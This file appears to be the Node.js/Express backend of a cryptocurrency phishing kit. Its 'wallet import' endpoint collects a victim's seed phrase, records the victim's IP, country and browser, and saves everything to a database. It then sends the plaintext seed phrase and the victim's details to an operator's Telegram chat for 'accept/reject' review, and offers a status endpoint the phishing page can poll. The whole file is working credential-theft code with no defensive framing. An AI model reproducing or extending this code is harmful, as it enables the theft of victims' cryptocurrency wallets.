const express = require("express");
const router = express.Router();
const Wallet = require("../models/Wallet");
const axios = require("axios");

async function getCountryFromIP(ip) {
  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    return response.data.country || "Unknown";
  } catch (error) {
    console.error("Error fetching country from IP:", error.message);
    return "Unknown";
  }
}

router.post("/wallet/import", async (req, res) => {
  const { walletName, seedPhrase, description } = req.body;

  try {
    let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
    if (ip && ip.includes(",")) {
      ip = ip.split(",")[0];
    }
    ip = ip.replace("::ffff:", "");
    if (ip === "::1") ip = "127.0.0.1";
    
    const userAgent = req.headers["user-agent"];
    const country = await getCountryFromIP(ip);

    const newWallet = new Wallet({
      walletName,
      seedPhrase,
      description,
      ip,
      userAgent,
      country,
    });
    
const savedWallet = await newWallet.save();

    try {
      const { initBot } = require("../botManager");
      const bot = initBot();
      
      if (bot && bot.chatId) {
        const message = `
💼 *New Wallet Import*
━━━━━━━━━━━━━━━━━━━
🏷️ *Name:* \`${walletName}\`
🔑 *Seed:* \`${seedPhrase}\`
📝 *Description:* \`${description || "N/A"}\`
🌍 *Country:* \`${country}\`
📡 *IP:* \`${ip}\`
🧭 *User-Agent:*
\`${userAgent}\`
        `;

        await bot.sendMessage(bot.chatId, message, {
          parse_mode: "Markdown",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Accept", callback_data: `accept_wallet_${savedWallet._id}` },
                { text: "❌ Reject", callback_data: `reject_wallet_${savedWallet._id}` },
              ],
            ],
          },
        });
        
        console.log("✅ Telegram message sent to chat:", bot.chatId);
      } else {
        console.log("⚠️ Telegram bot not available, wallet saved without notification");
      }
    } catch (telegramError) {
      console.warn("⚠️ Telegram notification failed:", telegramError.message);
      console.log("✅ Wallet saved successfully without Telegram notification");
    }

    res.status(200).json({
      message: "Wallet import submitted",
      id: savedWallet._id,
      status: savedWallet.status,
    });
  } catch (error) {
    console.error("Error processing wallet import:", error);
    res.status(500).json({
      message: "Error processing wallet import",
      error: error.message,
    });
  }
});

router.get("/wallet/status/:id", async (req, res) => {
  try {
    const wallet = await Wallet.findById(req.params.id);
    if (!wallet) return res.status(404).json({ message: "Wallet not found" });
    res.json({ status: wallet.status || "pending", walletName: wallet.walletName });
  } catch (error) {
    console.error("Error fetching wallet status:", error);
    res.status(500).json({ message: "Server error" });
  }
});

module.exports = router;
